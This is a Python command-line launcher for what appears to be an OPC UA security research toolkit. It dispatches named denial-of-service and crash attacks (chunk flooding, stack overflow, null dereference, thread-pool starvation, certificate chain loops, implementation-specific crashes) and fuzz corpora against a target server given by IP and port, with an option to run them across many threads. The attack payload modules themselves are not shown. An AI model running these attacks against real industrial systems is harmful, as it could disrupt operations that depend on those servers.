import os
import socket
import struct
import time
import datetime
import sys
import _thread

from protocol import *
from config import *

import payloads.sanity.sanity_read_nodes as sanity_read_nodes
import payloads.sanity.sanity_translate_browse_path as sanity_translate_browse_path
import payloads.sanity.sanity_diagnostic_info as sanity_diagnostic_info
import payloads.sanity.sanity_get_node_id_info as sanity_get_node_id_info
import payloads.corpus.opcua_message_file as opcua_message_file
import payloads.corpus.opcua_message_boofuzz_db as opcua_message_boofuzz_db
import payloads.corpus.attack_file_nodejs_opcua_v8_oom as attack_file_nodejs_opcua_v8_oom
import payloads.corpus.attack_file_ASNeG_OpcUaStack_unhandled_exception as attack_file_ASNeG_OpcUaStack_unhandled_exception
import payloads.attacks.chunk_flood as chunk_flood
import payloads.attacks.open_multiple_secure_channels as open_multiple_secure_channels
import payloads.attacks.close_session_with_old_timestamp as close_session_with_old_timestamp
import payloads.attacks.complex_nested_message as complex_nested_message
import payloads.attacks.translate_browse_path_call_stack_overflow as translate_browse_path_call_stack_overflow
import payloads.attacks.thread_pool_wait_starvation as thread_pool_wait_starvation
import payloads.attacks.unlimited_persistent_subscriptions as unlimited_persistent_subscriptions
import payloads.attacks.function_call_null_deref as function_call_null_deref
import payloads.attacks.malformed_utf8 as malformed_utf8
import payloads.attacks.race_change_and_browse_address_space as race_change_and_browse_address_space
import payloads.attacks.certificate_inf_chain_loop as certificate_inf_chain_loop
import payloads.attacks.unlimited_condition_refresh as unlimited_condition_refresh

# Example: 'start_threads_func(send_message_chunk_flooding, count=1, sleep_between=0.1, (SERVER_DETAILS, 1))'
def start_threads_func(func, count, sleep_between=1, params=None):
    for i in range(count):
        print("[-] Starting thread {} out of {} total threads".format(i, count))
        _thread.start_new_thread(func, params)
        if sleep_between:
            time.sleep(sleep_between)
    time.sleep(10000000)

####################################
OPCUA_DIR = "opcua_dir"
OPCUA_FILE = "opcua_file"
OPCUA_THREADS_FUNC = "threads_run"
OPCUA_BOOFUZZ_PAYLOAD = "boofuzz_db"

DICT_FUNCS = {
    # Thread running
    OPCUA_THREADS_FUNC: start_threads_func,

    # Sanity
    "sanity": sanity_read_nodes.attack,
    "sanity_read_nodes": sanity_read_nodes.attack,
    "sanity_translate_browse_path": sanity_translate_browse_path.attack,
    "sanity_read_diag_info": sanity_diagnostic_info.attack,
    "sanity_get_node_id_info": sanity_get_node_id_info.attack,

    # Send file/dir with files
    OPCUA_DIR: opcua_message_file.attack_dir,
    OPCUA_FILE: opcua_message_file.attack_file,
    OPCUA_BOOFUZZ_PAYLOAD: opcua_message_boofuzz_db.attack_boofuzz_payload,
    "attack_file_nodejs_opcua_v8_oom": attack_file_nodejs_opcua_v8_oom.attack,
    "attack_file_ASNeG_OpcUaStack_unhandled_exception": attack_file_ASNeG_OpcUaStack_unhandled_exception.attack,

    # Attacks
    "chunk_flood": chunk_flood.attack,
    "open_multiple_secure_channels" : open_multiple_secure_channels.attack,
    "close_session_with_old_timestamp": close_session_with_old_timestamp.attack,
    "complex_nested_message": complex_nested_message.attack,
    "translate_browse_path_call_stack_overflow": translate_browse_path_call_stack_overflow.attack,
    "thread_pool_wait_starvation": thread_pool_wait_starvation.attack,
    "unlimited_persistent_subscriptions": unlimited_persistent_subscriptions.attack,
    "function_call_null_deref": function_call_null_deref.attack,
    "malformed_utf8": malformed_utf8.attack,
    "race_change_and_browse_address_space": race_change_and_browse_address_space.attack,
    "certificate_inf_chain_loop": certificate_inf_chain_loop.attack,
    "unlimited_condition_refresh": unlimited_condition_refresh.attack,
}

####################################
def print_help():
    print("Help menu")
    print("[-] Usage: python3 main.py SERVER_TYPE IP_ADDR PORT ENDPOINT_ADDRESS FUNC_TYPE [DIR]")
    print("[-] Example: python3 main.py prosys 1.2.3.4 53530 /OPCUA/SimulationServer sanity")
    print("[-] Example: python3 main.py prosys 1.2.3.4 53530 /OPCUA/SimulationServer {} PATH_TO_DIR_WITH_CORPUS".format(OPCUA_DIR))
    print("[-] Example: python3 main.py prosys 1.2.3.4 53530 /OPCUA/SimulationServer {} FILE_PATH NUM_REQUESTS".format(OPCUA_FILE))
    print("[-] Example: python3 main.py prosys 1.2.3.4 53530 /OPCUA/SimulationServer {} FUNC_NAME COUNT".format(OPCUA_THREADS_FUNC))
    print("[-] Server types: {}".format(SERVERS_TYPE_NAME))
    print("[-] Function types: {}".format(list(DICT_FUNCS.keys())))
    exit()

def main():
    if len(sys.argv) < 6:
        print_help()

    python_path, server_type, ip_addr, port, endpoint_address, func_type = sys.argv[0:6]
    dir_corpus = None

    if server_type not in SERVERS_TYPE_NAME or\
        func_type not in DICT_FUNCS.keys() or\
        not port.isnumeric():
        print_help()

    if func_type == OPCUA_DIR:
        if len(sys.argv) != 7:
            print_help()
        else:
            dir_corpus = sys.argv[6]
            if not os.path.isdir(dir_corpus):
                print("'{}' is not a valid dir!".format(dir_corpus))
                print_help()
    
    if func_type == OPCUA_FILE:
        if len(sys.argv) < 7:
            print_help()
        else:
            filepath_corpus = sys.argv[6]
            if len(sys.argv) == 8:
                req_count = int(sys.argv[7])
            else:
                req_count = 1
            if not os.path.isfile(filepath_corpus):
                print("'{}' is not a valid dir!".format(dir_corpus))
                print_help()

    if func_type == OPCUA_THREADS_FUNC:
        if len(sys.argv) != 8:
            print_help()
        else:
            func_name = sys.argv[6]
            func_call_count = int(sys.argv[7])
            if func_name not in DICT_FUNCS:
                print("'{}' is not a valid func!".format(func_name))
                print_help()

    if func_type == OPCUA_BOOFUZZ_PAYLOAD:
        if len(sys.argv) < 6:
            print_help()
        else:
            if len(sys.argv) == 7:
                db_file_path = sys.argv[6]
                if not os.path.isfile(db_file_path):
                    print(f"'{db_file_path}' is not a valid boofuzz db file!")
                    print_help()
            else:
                db_file_path = "payloads/corpus/examples/corpus_example_boofuzz.db"

    port = int(port)
    server_details = (server_type, ip_addr, port, endpoint_address)
    print("**** Started at {} ****".format(datetime.now()))
    # Execute
    started_time = time.time()
    # Send all files in dir as OPCUA messages (corpus)
    if func_type == OPCUA_DIR:
        DICT_FUNCS[func_type](server_details, dir_corpus)
    # Send a single file as OPCUA message (corpus)
    elif func_type == OPCUA_FILE:
        DICT_FUNCS[func_type](server_details, filepath_corpus, req_count)
    # Run a function via multiple threads
    elif func_type == OPCUA_THREADS_FUNC:
        start_threads_func(func=DICT_FUNCS[func_name], count=func_call_count, sleep_between=0.5, params=(server_details,))
    # Run boofuzz corpus db
    elif func_type == OPCUA_BOOFUZZ_PAYLOAD:
        DICT_FUNCS[func_type](server_details, db_file_path)
    # Attack
    else:
        DICT_FUNCS[func_type](server_details)
    ended_time = time.time()
    print("**** Ended at {} (took {:.2f} seconds) ****".format(datetime.now(), ended_time-started_time))


if __name__ == "__main__":
    main()